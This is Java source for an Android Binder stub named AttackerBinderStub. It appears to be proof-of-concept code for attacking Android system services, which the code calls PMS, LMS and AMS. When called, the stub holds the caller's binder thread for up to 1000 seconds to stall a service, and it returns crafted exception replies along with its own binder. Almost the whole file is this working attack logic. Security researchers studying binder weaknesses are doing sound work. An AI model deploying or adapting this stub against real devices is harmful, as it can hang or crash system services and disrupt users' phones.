package com.example.z9.getallpackage;

import android.os.Binder;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

public class AttackerBinderStub extends Binder implements IInterface{
//	String mDescriptor = "com.hikame.testbinder.aidl.IRemoteService";
	String mDescriptor = "test";
	String tag = "BINDERTEST";
	
	protected boolean onTransact(int code, Parcel data, Parcel reply,
            int flags) throws RemoteException {
    	Log.d(tag, "I am in test onTransact. Code is " + code);
    	if (code == INTERFACE_TRANSACTION) {
    		try {
    			Log.d(tag, "I will sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
				Thread.sleep(1000);
				Log.d(tag, "I finished sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
    	}
    	else if(code == 1){	//IIntentSender.send || IInstrumentationWatcher.instrumentationStatus
    		if(Target.v.equals(Target.PMS)){
    			Log.i(tag, "TestTarget is PMS");
        		reply.writeException(new NullPointerException("TEST"));;
        		reply.writeStrongBinder(this);
    		}
    		else if(Target.v.equals(Target.LMS) || Target.v.equals(Target.AMS)){
    			Log.i(tag, "TestTarget is LMS/AMS");
    			Log.d(tag, "I will sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
    			int count = 0;
    			while(count < 1000){
    				Log.d(tag, count + " seconds. Thread - " + android.os.Process.myTid());
    				try {
    					Thread.sleep(1000);
    				} catch (InterruptedException e) {
    					e.printStackTrace();
    				}
    				count++;
    			}
    			Log.d(tag, "I finished sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
    		}
    	}
    	else if(code == 2){
    		reply.writeNoException();
    		reply.writeStrongBinder(this);
    	}
    	return true;
    }
	
	@Override
	public String getInterfaceDescriptor() {
		return mDescriptor;
	}

	@Override
	public boolean pingBinder() {
		return true;
	}

	@Override
	public boolean isBinderAlive() {
		 return true;
	}

	@Override
	public IInterface queryLocalInterface(String descriptor) {
		Log.d(tag, "I am in the queryLocalInterface");
        if (mDescriptor.equals(descriptor)) {
            return this;
        }
        return null;
	}

	@Override
	public IBinder asBinder() {
		return this;
	}

//	@Override
//    public void linkToDeath(DeathRecipient recipient, int flags) {
//		try {
//			Log.d(tag, "[linkToDeath] I will sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
//			Thread.sleep(5000);
//			Log.d(tag, "[linkToDeath] I finished sleep for INTERFACE_TRANSACTION. Thread - " + android.os.Process.myTid());
//		} catch (InterruptedException e) {
//			e.printStackTrace();
//		}
//    }
}
